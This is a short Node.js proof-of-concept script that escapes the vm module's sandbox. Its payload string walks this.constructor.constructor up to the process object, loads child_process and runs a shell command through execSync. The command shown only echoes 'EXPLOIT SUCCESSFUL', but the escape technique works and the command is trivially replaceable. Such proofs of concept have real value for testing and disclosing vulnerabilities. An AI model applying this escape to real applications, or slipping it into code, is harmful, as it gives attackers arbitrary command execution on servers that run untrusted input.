const vm = require('vm');
const safeEval = eval; // In the exploit, safeEval is just eval

const orderLinesData = 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("echo EXPLOIT SUCCESSFUL").toString()';

try {
  const sandbox = { safeEval, orderLinesData, context: Object.create(null) };
  vm.createContext(sandbox);
  // Using context
  const result = vm.runInContext('safeEval(orderLinesData, context)', sandbox, { timeout: 2000 });
  console.log(result.trim());
} catch (e) {
  console.log("Error:", e.message);
  process.exit(1);
}
